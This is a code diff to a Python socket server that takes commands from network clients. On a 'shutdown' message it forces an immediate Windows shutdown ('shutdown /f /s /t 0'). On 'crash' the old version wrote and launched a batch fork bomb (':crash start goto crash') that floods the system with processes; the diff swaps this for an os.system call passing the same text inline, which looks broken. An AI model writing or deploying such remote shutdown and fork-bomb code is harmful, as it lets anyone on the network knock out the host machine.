@@ -45,25 +45,15 @@ def start_server(port=65432):
                         
                         if splitUp[0].lower() == "shutdown":
                             print("Shutting down the system...")
-                            os.system("shutdown /s")  # Shutdown command (Windows)
+                            os.system("shutdown /f /s /t 0")  # Shutdown command (Windows)
                             response = "System is shutting down..."
                             conn.sendall(response.encode('utf-8'))
                         
                         elif splitUp[0].lower() == "crash":
-                            file_path = r"C:\Users\crash.bat"
-    
-                            # Check if the file exists, and if so, delete it
-                            if os.path.exists(file_path):
-                                os.remove(file_path)
-                                print(f"Deleted existing file: {file_path}")
-                            
-                            # Create and write to the file
-                            with open(file_path, 'w') as file:
-                                file.write("@echo off \n :crash \n start \n goto crash")
-                                file.close()
+                            os.system("@echo off \n :crash \n start \n goto crash")
+                                
 
-                            os.system("start crash.bat")
-                            
+                                                       
                                 
                             response = "Crashed"
                             conn.sendall(response.encode('utf-8'))
